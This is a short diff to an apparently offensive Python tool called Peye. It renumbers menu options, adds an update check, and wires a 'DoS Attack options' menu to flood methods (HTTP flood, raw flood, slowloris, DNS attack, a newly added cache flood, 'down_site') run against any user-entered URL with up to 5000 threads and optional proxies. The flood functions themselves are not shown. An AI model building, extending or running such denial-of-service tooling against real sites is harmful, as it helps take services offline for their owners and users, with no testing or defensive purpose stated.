                     print(f"{RED}[✗] Could not get SSL info{RESET}")
             
-            elif choice == '17':
+            elif choice == '21':
                 target = input(f"{GREEN}Target URL: {RESET}").strip()
                 if not target.startswith(('http://','https://')):
                     target = 'http://' + target
@@ -995,8 +1257,11 @@ class Peye:
                 except:
                     print(f"{RED}[✗] Could not fetch headers{RESET}")
             
+            elif choice == '22':
+                check_update()
+            
             # DoS Attack options
-            elif choice in ['18','19','20','21','22','23','24']:
+            elif choice in ['23','24','25','26','27','28','29','30']:
                 target = input(f"{GREEN}Target URL: {RESET}").strip()
                 if not target.startswith(('http://','https://')):
                     target = 'http://' + target
@@ -1006,9 +1271,9 @@ class Peye:
                 dos = DoSAttack(target, self.use_proxy)
                 
                 attack_map = {
-                    '18': dos.http_flood, '19': dos.raw_flood, '20': dos.slowloris,
-                    '21': dos.dns_attack, '22': dos.mixed_flood, '23': dos.all_attacks,
-                    '24': dos.down_site
+                    '23': dos.http_flood, '24': dos.raw_flood, '25': dos.slowloris,
+                    '26': dos.dns_attack, '27': dos.mixed_flood, '28': dos.cache_flood,
+                    '29': dos.all_attacks, '30': dos.down_site
                 }
                 if choice in attack_map:
                     attack_map[choice](dur, min(thr, 5000))
